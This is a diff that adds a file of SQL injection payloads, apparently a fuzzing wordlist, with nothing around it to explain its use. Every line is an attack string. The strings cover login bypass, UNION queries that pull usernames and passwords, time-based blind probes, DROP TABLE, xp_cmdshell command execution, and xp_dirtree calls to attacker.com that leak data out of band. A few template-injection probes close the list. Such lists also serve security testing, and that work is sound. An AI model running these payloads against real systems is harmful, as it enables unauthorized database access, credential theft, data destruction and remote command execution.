@@ -1,0 +1,82 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1/*
+" OR "1"="1
+" OR "1"="1" --
+" OR "1"="1" #
+" OR 1=1 --
+" OR 1=1 #
+') OR ('1'='1
+') OR ('1'='1' --
+")) OR (("1"="1
+1' ORDER BY 1 --
+1' ORDER BY 10 --
+1' ORDER BY 100 --
+1' ORDER BY 2 --
+1' ORDER BY 3 --
+1' ORDER BY 5 --
+1' UNION SELECT NULL --
+1' UNION SELECT NULL,NULL --
+1' UNION SELECT NULL,NULL,NULL --
+1' UNION SELECT NULL,NULL,NULL,NULL --
+1' UNION SELECT NULL,NULL,NULL,NULL,NULL --
+1' UNION SELECT 1,2,3 --
+1' UNION SELECT username,password FROM users --
+1; DROP TABLE users --
+1; EXEC xp_cmdshell('whoami') --
+1; WAITFOR DELAY '0:0:5' --
+' AND 1=1 --
+' AND 1=2 --
+' AND SLEEP(5) --
+' AND SUBSTRING(@@version,1,1)='5' --
+' AND (SELECT COUNT(*) FROM users)>0 --
+'; EXEC master..xp_cmdshell 'ping 127.0.0.1' --
+' HAVING 1=1 --
+' GROUP BY columnnames having 1=1 --
+admin' --
+admin'/*
+' OR ''='
+' OR 'x'='x
+' OR 1=1 LIMIT 1 --
+' OR 1=1 LIMIT 1 -- -
+' OR EXISTS(SELECT * FROM users) --
+1' AND extractvalue(1,concat(0x7e,version())) --
+1' AND updatexml(1,concat(0x7e,version()),1) --
+1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+' UNION SELECT table_name,NULL FROM information_schema.tables --
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT @@version,NULL --
+' UNION SELECT user(),NULL --
+' UNION SELECT database(),NULL --
+' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() --
+' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM users --
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1 OR 1=2
+-1 OR 1=1
+-1' UNION SELECT 1,2,3 --
+1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --
+1' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END) --
+1' AND IF(1=1,SLEEP(5),0) --
+1; IF (1=1) WAITFOR DELAY '0:0:5' --
+1' OR BENCHMARK(10000000,SHA1('test')) --
+1' AND pg_sleep(5) --
+1; SELECT pg_sleep(5) --
+1' AND RANDOMBLOB(500000000/0) --
+' OR 1=1; --
+' OR 1 IN (SELECT @@version) --
+' OR 1=1 UNION ALL SELECT 1,NULL,'<script>alert(1)</script>',table_name FROM information_schema.tables WHERE 2>1 --
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+';EXEC('xp_dirtree "\\attacker.com\share"') --
+1; DECLARE @q VARCHAR(8000);SET @q='\\attacker.com\share';EXEC master..xp_dirtree @q --
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int) --
+${7*7}
+{{7*7}}
+1;SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
